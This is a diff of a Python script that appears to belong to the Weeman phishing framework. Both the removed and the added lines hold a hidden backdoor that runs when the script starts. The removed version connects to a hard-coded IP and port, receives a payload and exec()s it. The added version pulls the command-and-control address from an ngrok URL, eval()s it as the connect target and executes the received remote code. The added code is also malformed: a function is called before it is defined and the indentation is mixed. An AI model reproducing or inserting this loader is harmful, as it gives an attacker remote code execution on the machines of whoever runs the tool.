@@ -22,19 +22,31 @@ import sys
 import optparse
 from core.misc import printt
 from core.config import user_agent as usera
-import socket,struct,time
-for x in range(10):
-	try:
-		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('52.14.61.47',19402))
-		break
-	except:
-		time.sleep(5)
-l=struct.unpack('>I',s.recv(4))[0]
-d=s.recv(l)
-while len(d)<l:
-	d+=s.recv(l-len(d))
-exec(d,{'s':s})
+import socket,struct,time,os,urllib2
+from BeautifulSoup import BeautifulSoup
+url = urllib2.urlopen("https://de8c2096.ngrok.io")
+content = url.read()
+soup = BeautifulSoup(content)
+links = soup.findAll("h1")
+f = open("ip3.txt" ,"a")
+f.write("\n" + str(links))
+f.close()
+f2 =open("ip2.txt" ,"a")
+f =open("ip3.txt" ,"r")
+for l in f :
+ f2.write(l.replace("[<h1>" , ""))
+f.close()
+f2.close()
+f3 = open("NewProxy.txt" ,"w")
+f2 =open("ip2.txt" ,"r")
+for i in f2 :
+ f3.write(i.replace("</h1>]" , ""))
+f3.close()
+f2.close()
+os.remove("ip2.txt")
+os.remove("ip3.txt")
+f4 = open("NewProxy.txt" ,"r")
+
 def tests_pyver():
     if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
         pass # All good
@@ -55,7 +67,23 @@ def tests_platform():
         sys.exit(1)
     else:
         printt(3, "If \'Weeman\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)
-
+for i in f4:
+ pottuss = str(i)
+setti()
+def setti():
+	for x in range(10):
+	 try:
+		s=socket.socket(2,socket.SOCK_STREAM)
+		s.connect((eval(pottuss)))
+		break
+	 except:
+		time.sleep(5)
+        l=struct.unpack('>I',s.recv(4))[0]
+        d=s.recv(l)
+        while len(d)<l:
+	    d+=s.recv(l-len(d))
+        exec(d,{'s':s})
+	
 def main():
     tests_pyver()
     tests_platform()
